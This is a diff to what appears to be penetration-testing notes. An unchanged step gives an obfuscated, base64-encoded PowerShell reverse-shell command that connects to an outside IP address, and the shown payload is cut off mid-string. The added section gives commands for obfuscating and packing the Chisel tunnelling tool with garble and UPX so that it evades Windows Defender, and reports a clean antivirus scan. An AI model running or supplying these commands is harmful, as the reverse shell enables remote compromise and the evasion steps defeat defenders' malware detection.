@@ -357,3 +357,18 @@ Serving HTTP on 0.0.0.0 port 80 ...
 5. Execute the PowerShell command on the attacking machine: `powershell.exe -a '-NoProfile -Command powershell.exe -EncodedCommand JABzAG8AYwBrAGUAdAAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0bwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAoACcANQAyAC4ANgAzAC4AMQA4AC4AMQA4ACcALAAgADQANAA0ADQAKQA7AAoAaQBmACgAJABzAG8AYwBrAGUAdAAgAC0AZQBxACAAJABuAHUAbABsACkAewBlAHgAaQB0ACAAMQB9AAoAJABzAHQAcgBlAGEAbQAgAD0AIAAkAHMAbwBjAGsAZQB0AC40AHIAZQBhAG0AKAApADsACgAkAHc'`
 
 6. If lucky, you may get a shell.
+
+# Getting go binaries past Defender!
+Inspiration: https://twitter.com/snovvcrash/status/1540395267064741890?lang=en
+
+I ran the below commands on Windows, (using git & golang) however, the above Tweet shows that its definitely possible in Kali.
+
+The commands used to create a Garble version of Chisel are as below:
+```
+go install mvdan.cc/garble@latest
+git clone https://github.com/jpillora/chisel.git
+cd chisel
+garble -tiny -literals -seed=random build main.go
+```
+No detections against Windows Defender as of 30/03/2023: https://antiscan.me/scan/new/result?id=MlpqAEXx9ohJ
+(I had to use `upx` to get the binary smaller than 10mb as that is the limit for antiscan.me)
